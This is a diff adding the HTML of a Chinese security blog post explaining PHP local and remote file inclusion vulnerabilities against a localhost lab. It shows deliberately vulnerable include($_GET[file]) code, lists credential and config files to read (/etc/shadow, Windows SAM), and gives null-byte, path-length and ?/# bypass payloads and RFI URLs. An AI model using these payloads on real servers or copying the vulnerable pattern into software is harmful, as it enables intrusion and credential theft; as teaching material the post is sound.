@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"bmoos.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言（冲冲冲，继续学习。） 什么是文件包含漏洞？ 服务器通过PHP的特性去包含任意文件时，对文件来源过滤不严，从而可以包含一个恶意文件。 简要来说，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间，但是如果这个包含的文件是变量或者用户可以篡改的，且开发人员过滤不严，那么就有可能包含一个恶意文件，导致服务器遭到侵害。 （注意：文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="https://bmoos.github.io/2020/04/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="BMooS">
+<meta property="og:description" content="前言（冲冲冲，继续学习。） 什么是文件包含漏洞？ 服务器通过PHP的特性去包含任意文件时，对文件来源过滤不严，从而可以包含一个恶意文件。 简要来说，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间，但是如果这个包含的文件是变量或者用户可以篡改的，且开发人员过滤不严，那么就有可能包含一个恶意文件，导致服务器遭到侵害。 （注意：文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/14/JpCGyF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/14/JpVpX6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/19/JKwvZV.png">
+<meta property="article:published_time" content="2020-04-05T16:31:59.000Z">
+<meta property="article:modified_time" content="2020-04-19T13:05:38.259Z">
+<meta property="article:author" content="BMooS">
+<meta property="article:tag" content="文件包含漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/04/14/JpCGyF.png">
+
+<link rel="canonical" href="https://bmoos.github.io/2020/04/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>文件包含漏洞 | BMooS</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5a6862eba0dd0e57faf5fff97dbcb849";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BMooS" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BMooS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://bmoos.github.io/2020/04/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://s2.ax1x.com/2020/01/15/lOIrB4.jpg">
+      <meta itemprop="name" content="BMooS">
+      <meta itemprop="description" content="BMooS的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BMooS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-06 00:31:59" itemprop="dateCreated datePublished" datetime="2020-04-06T00:31:59+08:00">2020-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-19 21:05:38" itemprop="dateModified" datetime="2020-04-19T21:05:38+08:00">2020-04-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>（冲冲冲，继续学习。）</p>
+<p>什么是文件包含漏洞？</p>
+<p>服务器通过PHP的特性去包含任意文件时，对文件来源过滤不严，从而可以包含一个恶意文件。</p>
+<p>简要来说，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间，但是如果这个包含的文件是变量或者用户可以篡改的，且开发人员过滤不严，那么就有可能包含一个恶意文件，导致服务器遭到侵害。</p>
+<p>（注意：文件包含不止在PHP中，只是PHP比较严重而已，其他脚本语言例如JSP，ASP也有文件包含漏洞）</p>
+<a id="more"></a>
+
+<h1 id="PHP中关于文件包含的函数"><a href="#PHP中关于文件包含的函数" class="headerlink" title="PHP中关于文件包含的函数"></a>PHP中关于文件包含的函数</h1><p>PHP中文件包含函数有以下四种：</p>
+<blockquote>
+<p>require()</p>
+<p>require_once()</p>
+<p>include()</p>
+<p>include_once()</p>
+</blockquote>
+<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p>当使用这4个函数包含一个新文件时，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件类型，只要文件中含有PHP代码既可以服务器所解析。</p>
+<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><p>当出现以下两种情况的时候，就可以利用到文件包含漏洞：</p>
+<ol>
+<li>include等函数通过变量控制需要包含的文件</li>
+<li>用户能够控制这些变量</li>
+</ol>
+<h2 id="本地文件包含LFI"><a href="#本地文件包含LFI" class="headerlink" title="本地文件包含LFI"></a>本地文件包含LFI</h2><p>举一个简单例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[file]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个<code>test</code>中可以看到由用户可以控制的<code>$_GET</code>传入的参数<code>file</code>可以指定<code>include</code>函数所包含的文件</p>
+<p>我们在该目录建立一个txt文件，其中包含PHP代码</p>
+<p><img src="https://s1.ax1x.com/2020/04/14/JpCGyF.png" alt="JpCGyF.png"></p>
+<p>URL为:<code>http://localhost/file_include/test.php?file=1.txt</code></p>
+<p><img src="https://s1.ax1x.com/2020/04/14/JpVpX6.png" alt="JpVpX6.png"></p>
+<p>如果是不加限制的文件包含漏洞，那么我们可以使用目录遍历漏洞轻易的知道很多敏感信息，比如：</p>
+<p>Windows系统</p>
+<blockquote>
+<p>c:\boot.ini // 查看系统版本</p>
+<p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p>
+<p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p>
+<p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p>
+<p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p>
+<p>c:\windows\php.ini // php 配置信息</p>
+</blockquote>
+<p>Linux/Unix系统</p>
+<blockquote>
+<p>/etc/passwd // 账户信息</p>
+<p>/etc/shadow // 账户密码文件</p>
+<p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p>
+<p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p>
+<p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
+<p>/etc/my.conf // mysql 配置文件    </p>
+</blockquote>
+<p>​    一般可以将本地文件包含配合文件上传漏洞使用，文件上传漏洞可以看我之前的博客，假若攻击者上传webshell到服务器上，只需知道其路径和名称，就可以配合文件包含漏洞使用，但是这里面有个问题。</p>
+<p>如果关于文件包含的代码如下所示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>只会在请求中获取文件名，在代码中加入后缀名。</p>
+<p>这个时候我们可以用到%00截断，因为php的内核是用c实现的，因此使用了一些字符串处理函数，在连接字符串的时候，0字节(\x00)可以看作字符串结束符。那么我们就可以使用%00截断来实现绕过。但是有个前提条件：<code>magic_quotes_gpc = Off</code>且php版本&lt;5.3.4，因为当<code>magic_quotes_gpc = On</code>时候，会将%00看作NULL处理。</p>
+<p>还有一种就是路径长度截断：</p>
+<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<blockquote>
+<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
+<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
+</blockquote>
+<p>可以用到这样的文件名：</p>
+<p><code>test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></p>
+<p>在windows环境下还可以使用点号截断：</p>
+<p>条件：windows OS，点号需要长于256</p>
+<p>举例：</p>
+<p><code>filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>
+<h2 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h2><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<blockquote>
+<p>allow_url_fopen = On（是否允许打开远程文件，默认开启）</p>
+<p>allow_url_include = On（是否允许include/require远程文件，默认关闭）</p>
+</blockquote>
+<p>举例：</p>
+<p>引用上面的测试代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[file]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt</code></p>
+<p><img src="https://s1.ax1x.com/2020/04/19/JKwvZV.png" alt="JKwvZV.png"></p>
+<p>如果远程文件包含也使用了如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么可以使用<code>?</code>和<code>#</code>进行绕过：</p>
+<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt?</code></p>
+<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt#</code></p>
+<h1 id="本地文件包含的利用技巧"><a href="#本地文件包含的利用技巧" class="headerlink" title="本地文件包含的利用技巧"></a>本地文件包含的利用技巧</h1><p>在本地文件包含中如何执行php代码，这也是具有方法的。</p>
+<p>远程文件包含之所以可以执行命令，就是因为攻击者可以自定义被包含的文件内容，因此本地文件包含漏洞想要执行命令，也需要找到一个可以被攻击者能控制内容的文件。</p>
+<p>一般来说，有以下几种：</p>
+<ol>
+<li>包含用户上传的文件 (这个配合文件上传漏洞)</li>
+<li>包含data://或者php://input等伪协议(这个利用下面那个文章里面有)</li>
+<li>包含Session文件(这个我尝试过，可用空间不大，应用范围比较小)</li>
+<li>包含日志文件</li>
+<li>包含其他上传的临时文件，以及其他应用所创建的临时文件</li>
+</ol>
+<p>这些利用方式具体得看实战环境，之后我会慢慢介绍。</p>
+<p>同时，推荐这篇文章，关于文件包含漏洞写的不错，<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag"># 文件包含漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="prev" title="文件上传漏洞">
+      <i class="fa fa-chevron-left"></i> 文件上传漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/19/LeetCode%E9%A2%98%E8%A7%A3289/" rel="next" title="LeetCode题解289">
+      LeetCode题解289 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP中关于文件包含的函数"><span class="nav-number">2.</span> <span class="nav-text">PHP中关于文件包含的函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP文件包含利用"><span class="nav-number">3.</span> <span class="nav-text">PHP文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本地文件包含LFI"><span class="nav-number">3.1.</span> <span class="nav-text">本地文件包含LFI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程文件包含RFI"><span class="nav-number">3.2.</span> <span class="nav-text">远程文件包含RFI</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#本地文件包含的利用技巧"><span class="nav-number">4.</span> <span class="nav-text">本地文件包含的利用技巧</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BMooS"
+      src="https://s2.ax1x.com/2020/01/15/lOIrB4.jpg">
+  <p class="site-author-name" itemprop="name">BMooS</p>
+  <div class="site-description" itemprop="description">BMooS的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BMooS" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BMooS" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:slibo921@gmail.com" title="E-Mail → mailto:slibo921@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lyuan.co/" title="https:&#x2F;&#x2F;lyuan.co&#x2F;" rel="noopener" target="_blank">霹雳无敌我大哥</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ftosims.github.io/" title="https:&#x2F;&#x2F;ftosims.github.io&#x2F;" rel="noopener" target="_blank">宇宙洪荒我烺神</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BMooS</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">100k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:31</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.6' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
